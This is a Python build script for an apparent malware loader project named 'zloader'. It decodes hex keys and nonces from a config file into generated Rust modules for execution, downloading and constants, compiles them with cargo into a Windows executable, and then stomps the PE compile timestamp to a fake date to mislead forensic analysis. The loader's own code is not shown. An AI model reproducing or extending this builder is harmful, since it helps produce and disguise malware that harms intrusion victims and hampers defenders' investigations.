import yaml
import os
import subprocess
import datetime
import pefile
from jinja2 import Environment, FileSystemLoader

config_path = "config.yaml"
project_name = "zloader"

def stomp_compile_timestamp(target_pe_path, target_date_str):
    if not os.path.exists(target_pe_path):
        print(f"[-] Error: File '{target_pe_path}' not found.")
        return

    try:
        target_date = datetime.datetime.strptime(
            target_date_str, "%Y-%m-%d %H:%M:%S"
        )
        new_epoch_timestamp = int(target_date.timestamp())

        print(f"[*] Loading {target_pe_path}...")
        pe = pefile.PE(target_pe_path, fast_load=True)

        orig_epoch = pe.FILE_HEADER.TimeDateStamp
        orig_date = datetime.datetime.fromtimestamp(orig_epoch).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        print(f"[+] Original TimeDateStamp: {orig_date} (Epoch: {orig_epoch})")

        pe.FILE_HEADER.TimeDateStamp = new_epoch_timestamp
    
        # Drop handle so we can write out the final modified binary to the same file
        data = pe.write()
        pe.close()
        with open(target_pe_path, "wb") as file:
            file.write(data)

        print(
            f"[+] Successfully stomped TimeDateStamp to: {target_date_str} (Epoch: {new_epoch_timestamp})"
        )

    except pefile.PEFormatError:
        print("[-] Error: The target file is not a valid PE file.")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")

def parse_hex_blob(hex_string: str) -> list[str]:
    if not hex_string:
        return []
    clean_hex = hex_string.strip().replace("0x", "")
    return [f"0x{clean_hex[i:i+2]}" for i in range(0, len(clean_hex), 2)]

def template(template_path: str, output_path: str, vars: dict):
    template_dir = os.path.dirname(template_path) or "."
    template_name = os.path.basename(template_path)
    
    env = Environment(
        loader=FileSystemLoader(template_dir),
        trim_blocks=True,
        lstrip_blocks=True
    )
    
    tpl = env.get_template(template_name)
    rendered_code = tpl.render(**vars)
    
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    
    with open(output_path, "w") as f:
        f.write(rendered_code)
        
    print(f"[+] Templated {template_path} -> {output_path}")

def cargo(args: list[str]):
    print(f"[+] Running: cargo {' '.join(args)}")
    try:
        subprocess.run(["cargo"] + args, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Cargo command failed with exit code {e.returncode}")
        exit(1)

def build():
    
    if not os.path.exists(config_path):
        print(f"[-] Error: {config_path} not found.")
        return

    with open(config_path, "r") as f:
        config = yaml.safe_load(f)
    compile_date = config.get("compile_date", "2022-04-12 23:08:34")

    # Parse hex
    if "decoders" in config:
        for decoder in config["decoders"]:
            if "key" in decoder and isinstance(decoder["key"], str):
                decoder["key"] = parse_hex_blob(decoder["key"])
                
            if "nonce" in decoder and isinstance(decoder["nonce"], str):
                decoder["nonce"] = parse_hex_blob(decoder["nonce"])

    template(
        template_path="scripts/templates/exec.rs.j2", 
        output_path="src/generated/exec.rs", 
        vars=config
    )

    template(
        template_path="scripts/templates/download.rs.j2", 
        output_path="src/generated/download.rs", 
        vars=config
    )

    template(
        template_path="scripts/templates/consts.rs.j2", 
        output_path="src/generated/consts.rs", 
        vars=config
    )
    
    cargo(["fmt"]) 
    cargo(["check"])
    cargo(["build", "--release"])
    stomp_compile_timestamp(f"target/release/{project_name}.exe", compile_date)
    # If you want to add new post compile modules, add them here

if __name__ == "__main__":
    build()